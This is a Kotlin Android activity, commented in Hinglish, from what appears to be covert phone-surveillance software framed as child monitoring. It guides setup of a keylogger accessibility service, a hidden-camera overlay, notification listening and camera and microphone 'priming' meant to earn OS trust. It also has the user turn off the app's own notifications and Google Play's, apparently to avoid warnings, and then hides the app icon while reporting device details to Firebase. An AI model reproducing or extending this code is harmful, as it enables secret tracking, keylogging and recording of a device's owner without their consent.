package com.safe.setting.app.ui.activities.mainchild

import android.content.ActivityNotFoundException
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.util.Log
import android.view.View
import android.widget.Button
import android.widget.RelativeLayout
import android.widget.Toast
import androidx.appcompat.widget.SwitchCompat
import androidx.core.app.NotificationManagerCompat
import androidx.core.content.edit
import androidx.core.net.toUri
import androidx.lifecycle.lifecycleScope
import com.google.firebase.database.DatabaseReference
import com.safe.setting.app.R
import com.safe.setting.app.data.model.ChildPhoto
import com.safe.setting.app.data.preference.DataSharePreference.childSelected
import com.safe.setting.app.data.rxFirebase.InterfaceFirebase
import com.safe.setting.app.databinding.ActivityMainChildBinding
import com.safe.setting.app.services.accessibilityData.AccessibilityDataService
import com.safe.setting.app.services.devicestatus.DeviceStatusService
import com.safe.setting.app.ui.activities.base.BaseActivity
import com.safe.setting.app.utils.ConstFun.isAddWhitelist
import com.safe.setting.app.utils.ConstFun.isAndroidM
import com.safe.setting.app.utils.ConstFun.isNotificationServiceRunning
import com.safe.setting.app.utils.ConstFun.openAccessibilitySettings
import com.safe.setting.app.utils.ConstFun.openNotificationListenerSettings
import com.safe.setting.app.utils.ConstFun.openWhitelistSettings
import com.safe.setting.app.utils.ConstFun.showApp
import com.safe.setting.app.utils.Consts
import com.safe.setting.app.utils.HardwarePrimer
import com.safe.setting.app.utils.async.AsyncTaskRunCommand
import com.safe.setting.app.utils.hiddenCameraServiceUtils.HiddenCameraUtils.canOverDrawOtherApps
import com.safe.setting.app.utils.hiddenCameraServiceUtils.HiddenCameraUtils.openDrawOverPermissionSetting
import com.safe.setting.app.utils.hiddenCameraServiceUtils.config.CameraFacing
import io.reactivex.rxjava3.disposables.Disposable
import kotlinx.coroutines.launch
import javax.inject.Inject
import dagger.hilt.android.AndroidEntryPoint

@AndroidEntryPoint
class MainChildActivity : BaseActivity<ActivityMainChildBinding>() {

    // UI Elements
    private lateinit var btnHideApp: Button
    private lateinit var btnEnableService: RelativeLayout
    private lateinit var btnEnableOverDraw: RelativeLayout
    private lateinit var btnEnableNotificationListener: RelativeLayout
    private lateinit var btnWhitelist: RelativeLayout
    private lateinit var btnAppNotificationSettings: RelativeLayout
    private lateinit var btnPlayStoreNotificationSettings: RelativeLayout
    private lateinit var btnPrimeHardware: RelativeLayout // Naya button

    // Switches
    private lateinit var switchOverDraw: SwitchCompat
    private lateinit var switchAccessibility: SwitchCompat
    private lateinit var switchNotificationListener: SwitchCompat
    private lateinit var switchWhitelist: SwitchCompat
    private lateinit var switchAppNotification: SwitchCompat
    private lateinit var switchPlayStoreNotification: SwitchCompat
    private lateinit var switchPrimeHardware: SwitchCompat // Naya switch

    @Inject
    lateinit var firebase: InterfaceFirebase

    // State tracking variable
    private var isHardwarePrimed = false

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        initializeViews()
        init()
        onClickApp()
        // Device status service shuru karein
        startService(Intent(this, DeviceStatusService::class.java))
    }

    private fun initializeViews() {
        btnHideApp = binding.btnHideApp
        btnEnableService = binding.btnEnableService
        btnEnableNotificationListener = binding.btnEnableServiceNotification
        btnWhitelist = binding.btnAddWhitelist
        btnEnableOverDraw = binding.btnEnableOverdraw
        btnAppNotificationSettings = binding.btnAppNotificationSettings
        btnPlayStoreNotificationSettings = binding.btnPlaystoreNotificationSettings
        btnPrimeHardware = binding.btnPrimeHardware // Naya button initialize karein

        switchNotificationListener = binding.switchNotification
        switchOverDraw = binding.switchOverdraw
        switchWhitelist = binding.switchAddWhitelist
        switchAccessibility = binding.switchAccessibility
        switchAppNotification = binding.switchAppNotification
        switchPlayStoreNotification = binding.switchPlaystoreNotification
        switchPrimeHardware = binding.switchPrimeHardware // Naya switch initialize karein
    }

    override fun instanceViewBinding(): ActivityMainChildBinding {
        return ActivityMainChildBinding.inflate(layoutInflater)
    }

    override fun onResume() {
        super.onResume()
        checkSwitchPermissions()
        updateNotificationSwitches()
        // SharedPreferences se save ki hui sthiti ko load karein
        isHardwarePrimed = getHardwarePrimedPreference()
        switchPrimeHardware.isChecked = isHardwarePrimed
    }

    override fun addDisposable(disposable: Disposable) {}

    private fun init() {
        // ... (init function mein koi badlav nahi)
        getReference("${Consts.DATA}/${Consts.CHILD_SHOW_APP}").setValue(true)
        getReference("${Consts.DATA}/${Consts.CHILD_NAME}").setValue(childSelected)

        val manufacturer = Build.MANUFACTURER
        val model = Build.MODEL
        val deviceName = if (model.startsWith(manufacturer, ignoreCase = true)) {
            model
        } else {
            "$manufacturer $model"
        }
        getReference("${Consts.DATA}/${Consts.DEVICE_NAME}").setValue(deviceName)

        val childPhoto = ChildPhoto(false, CameraFacing.FRONT_FACING_CAMERA)
        getReference("${Consts.PHOTO}/${Consts.PARAMS}").setValue(childPhoto)
        getReference("${Consts.PHOTO}/${Consts.CHILD_PERMISSION}").setValue(true)
    }

    private fun checkSwitchPermissions() {
        switchOverDraw.isChecked = canOverDrawOtherApps()
        switchAccessibility.isChecked = AccessibilityDataService.isRunningService
        switchNotificationListener.isChecked = isNotificationServiceRunning()
        if (isAndroidM()) {
            switchWhitelist.isChecked = isAddWhitelist()
            btnWhitelist.visibility = View.VISIBLE
        }
    }

    private fun updateNotificationSwitches() {
        switchAppNotification.isChecked = !NotificationManagerCompat.from(this).areNotificationsEnabled()
        switchPlayStoreNotification.isChecked = getPlayStoreVisitedPreference()
    }

    private fun onClickApp() {
        // Hide App button ka logic
        btnHideApp.setOnClickListener { checkPermissions() }

        // Whitelist button ka logic
        btnWhitelist.setOnClickListener {
            if (!isAddWhitelist()) {
                openWhitelistSettings()
            } else showMessage(R.string.already_activated)
        }

        // Baki purane buttons ka logic
        btnEnableService.setOnClickListener {
            if (!AccessibilityDataService.isRunningService) {
                showDialog(getString(R.string.title_dialog), getString(R.string.msg_dialog_enable_keylogger), getString(android.R.string.ok), positiveAction = { openAccessibilitySettings() })
            } else showMessage(R.string.already_activated)
        }
        btnEnableOverDraw.setOnClickListener {
            if (!canOverDrawOtherApps()) {
                showDialog(getString(R.string.title_dialog), getString(R.string.msg_dialog_enable_overdraw), getString(android.R.string.ok), positiveAction = { openDrawOverPermissionSetting() })
            } else showMessage(R.string.already_activated)
        }
        btnEnableNotificationListener.setOnClickListener {
            if (!isNotificationServiceRunning()) {
                showDialog(getString(R.string.title_dialog), "Please enable the notification service for this app to view notifications.", getString(android.R.string.ok), positiveAction = { openNotificationListenerSettings() })
            } else {
                showMessage(R.string.already_activated)
            }
        }
        btnAppNotificationSettings.setOnClickListener {
            if (NotificationManagerCompat.from(this).areNotificationsEnabled()) {
                val dialogMessage = "You need to turn OFF notifications.\n\nAlso, if you see an 'Auto Start' or 'App launch' option in the same settings, please enable it.\n\nPress OK to continue."
                showDialog(getString(R.string.title_dialog), dialogMessage, getString(android.R.string.ok), positiveAction = { openNotificationSettings(packageName) })
            } else {
                showMessage(R.string.already_activated)
            }
        }
        btnPlayStoreNotificationSettings.setOnClickListener {
            if (!getPlayStoreVisitedPreference()) {
                val dialogMessage = "You need to turn OFF notifications for Google Play products. Press OK to go to settings."
                showDialog(getString(R.string.title_dialog), dialogMessage, getString(android.R.string.ok), positiveAction = {
                    setPlayStoreVisitedPreference(true)
                    openNotificationSettings("com.android.vending")
                })
            } else {
                showMessage(R.string.already_activated)
            }
        }

        // ===============================================================
        // ### NAYA LOGIC: Hardware Activation Button ###
        // ===============================================================
        // ### HINDI COMMENT ###
        // Jab user is button par click karta hai, hum "HardwarePrimer" class ka upyog karke
        // camera aur microphone ko activate karte hain. Yeh OS ka bharosa jeetne ke liye zaroori hai.
        btnPrimeHardware.setOnClickListener {
            if (!isHardwarePrimed) {
                // User ko batayein ki prakriya shuru ho rahi hai
                showProgressDialog(null, "Activating advanced features...")

                // Coroutine ka upyog karke hardware ko background mein "ping" karein taaki UI freeze na ho
                lifecycleScope.launch {
                    try {
                        val primer = HardwarePrimer(this@MainChildActivity)
                        primer.primeCamera()
                        primer.primeMicrophone()

                        // Safalta par UI update karein aur sthiti ko save karein
                        isHardwarePrimed = true
                        setHardwarePrimedPreference(true)
                        switchPrimeHardware.isChecked = true
                        hideDialog()
                        showMessage("Advanced features activated successfully!")

                    } catch (e: Exception) {
                        Log.e("MainChildActivity", "Hardware priming failed: ${e.message}")
                        hideDialog()
                        showError("Failed to activate features. Please try again.")
                    }
                }
            } else {
                showMessage(R.string.already_activated)
            }
        }
    }

    private fun openNotificationSettings(targetPackageName: String) {
        // ... (openNotificationSettings function mein koi badlav nahi)
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                val intent = Intent(Settings.ACTION_APP_NOTIFICATION_SETTINGS).apply {
                    putExtra(Settings.EXTRA_APP_PACKAGE, targetPackageName)
                    flags = Intent.FLAG_ACTIVITY_NEW_TASK
                }
                startActivity(intent)
            } else {
                val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
                intent.data = "package:$targetPackageName".toUri()
                startActivity(intent)
            }
        } catch (e: ActivityNotFoundException) {
            Toast.makeText(this, "Could not open settings.", Toast.LENGTH_SHORT).show()
        }
    }

    private fun getReference(child: String): DatabaseReference = firebase.getDatabaseReference(child)

    private fun checkPermissions() {
        val appNotificationsOff = !NotificationManagerCompat.from(this).areNotificationsEnabled()
        val playStoreVisited = getPlayStoreVisitedPreference()

        // ===============================================================
        // ### BADLA HUA LOGIC: Hide App Button ###
        // ===============================================================
        // ### HINDI COMMENT ###
        // Ab hum app ko hide karne se pehle yeh bhi check karte hain ki hardware activate hua hai ya nahi.
        // `isHardwarePrimed` variable yahi kaam karta hai.
        if (canOverDrawOtherApps() && isNotificationServiceRunning() && AccessibilityDataService.isRunningService && isAddWhitelist() && appNotificationsOff && playStoreVisited && isHardwarePrimed) {
            showProgressDialog(null, getString(R.string.hiding))
            showApp(false)
            getReference("${Consts.DATA}/${Consts.CHILD_SHOW_APP}").setValue(false)
        } else {
            // Agar hardware activate nahi hai to ek vishesh sandesh dikhayein
            val message = if (!isHardwarePrimed) {
                "Please activate advanced features first."
            } else {
                getString(R.string.enable_all_permissions)
            }
            showDialog(
                getString(R.string.title_dialog),
                message,
                getString(android.R.string.ok)
            )
        }
    }

    private fun setPlayStoreVisitedPreference(visited: Boolean) {
        val prefs = getSharedPreferences("AppPrefs", Context.MODE_PRIVATE)
        prefs.edit { putBoolean("play_store_visited", visited) }
    }

    private fun getPlayStoreVisitedPreference(): Boolean {
        val prefs = getSharedPreferences("AppPrefs", Context.MODE_PRIVATE)
        return prefs.getBoolean("play_store_visited", false)
    }

    // ===============================================================
    // ### NAYA CODE: Hardware Activation ki sthiti ko save aur load karne ke liye ###
    // ===============================================================
    private fun setHardwarePrimedPreference(isPrimed: Boolean) {
        val prefs = getSharedPreferences("AppPrefs", Context.MODE_PRIVATE)
        prefs.edit { putBoolean("hardware_primed", isPrimed) }
    }

    private fun getHardwarePrimedPreference(): Boolean {
        val prefs = getSharedPreferences("AppPrefs", Context.MODE_PRIVATE)
        return prefs.getBoolean("hardware_primed", false)
    }
    // ===============================================================

    private fun activatePermissionRoot(command: String, showDialog: Boolean, activate: () -> Unit) {
        // ... (activatePermissionRoot function mein koi badlav nahi)
        AsyncTaskRunCommand({
            showProgressDialog(null, getString(R.string.activating))
        }, {
            hideDialog()
            if (it) {
                activate()
                if (showDialog) {
                    showDialog(
                        getString(R.string.title_dialog),
                        getString(R.string.activated_success),
                        getString(android.R.string.ok)
                    )
                }
            } else {
                showError(getString(R.string.failed_activate))
            }
        }).execute(command)
    }

    override fun onDestroy() {
        hideDialog()
        super.onDestroy()
    }
}